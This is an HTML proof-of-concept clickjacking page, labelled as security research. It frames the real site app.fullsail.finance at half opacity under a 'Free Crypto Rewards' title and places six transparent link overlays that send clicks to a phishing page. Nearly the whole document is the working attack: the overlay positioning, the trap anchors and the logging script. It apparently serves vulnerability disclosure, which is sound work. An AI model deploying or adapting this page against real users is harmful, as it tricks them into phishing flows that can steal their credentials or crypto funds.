<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Free Crypto Rewards</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .demo-banner {
            background: #ff6b6b;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 99999;
        }
        .container {
            padding-top: 60px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .iframe-container {
            position: relative;
            width: 100%;
            height: 800px;
            margin: 20px auto;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        #legitimateIframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.5;
        }
        .malicious-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 100;
        }
        .click-trap {
            position: absolute;
            pointer-events: auto;
            cursor: pointer;
            background: transparent;
            border: none;
        }
        .click-trap.visible {
            background: rgba(255, 0, 0, 0.3);
            border: 3px solid red;
        }
        .click-trap:hover.visible { background: rgba(255, 0, 0, 0.5); }

        .trap-center {
            top: 45%; left: 50%; transform: translate(-50%, -50%);
            width: 300px; height: 60px;
        }
        .trap-top {
            top: 20%; left: 50%; transform: translateX(-50%);
            width: 250px; height: 50px;
        }
        .trap-bottom {
            bottom: 20%; left: 50%; transform: translateX(-50%);
            width: 250px; height: 50px;
        }
        .trap-left {
            top: 50%; left: 15%; transform: translateY(-50%);
            width: 200px; height: 50px;
        }
        .trap-right {
            top: 50%; right: 15%; transform: translateY(-50%);
            width: 200px; height: 50px;
        }
        .trap-wide {
            top: 35%; left: 50%; transform: translateX(-50%);
            width: 80%; height: 40%;
        }
    </style>
</head>
<body>
    <div class="demo-banner">
        üî¥ SECURITY RESEARCH PoC - This demonstrates clickjacking vulnerability on https://app.fullsail.finance/
    </div>

    <div class="container">
        <div class="iframe-container">
            <!-- The legitimate fullsail finance site -->
            <iframe 
                id="legitimateIframe"
                src="https://app.fullsail.finance/"
                sandbox="allow-scripts allow-same-origin"
            ></iframe>

            <!-- Invisible malicious overlay with click traps -->
            <div class="malicious-overlay" id="maliciousOverlay">
                <a href="phishing-site.html" class="click-trap trap-center" id="trap1" target="_blank"></a>
                <a href="phishing-site.html" class="click-trap trap-top" id="trap2" target="_blank"></a>
                <a href="phishing-site.html" class="click-trap trap-bottom" id="trap3" target="_blank"></a>
                <a href="phishing-site.html" class="click-trap trap-left" id="trap4" target="_blank"></a>
                <a href="phishing-site.html" class="click-trap trap-right" id="trap5" target="_blank"></a>
                <a href="phishing-site.html" class="click-trap trap-wide" id="trap6" target="_blank"></a>
            </div>
        </div>
    </div>

    <script>
        const iframe = document.getElementById('legitimateIframe');
        const traps = document.querySelectorAll('.click-trap');

        // Log clicks for demonstration
        traps.forEach((trap, index) => {
            trap.addEventListener('click', function(e) {
                console.log(`üö® ATTACK: Click trap ${index + 1} triggered - Redirecting to phishing site`);
            });
        });

        iframe.addEventListener('load', () => {
            console.log('‚úÖ Legitimate site loaded in iframe');
            console.log('üéØ Malicious click traps are active');
        });

        iframe.addEventListener('error', () => {
            console.error('‚ùå Failed to load - Site may have X-Frame-Options protection');
            alert('The target site could not be loaded. This might mean they already have clickjacking protection enabled (X-Frame-Options or CSP frame-ancestors).');
        });
    </script>
</body>
</html>
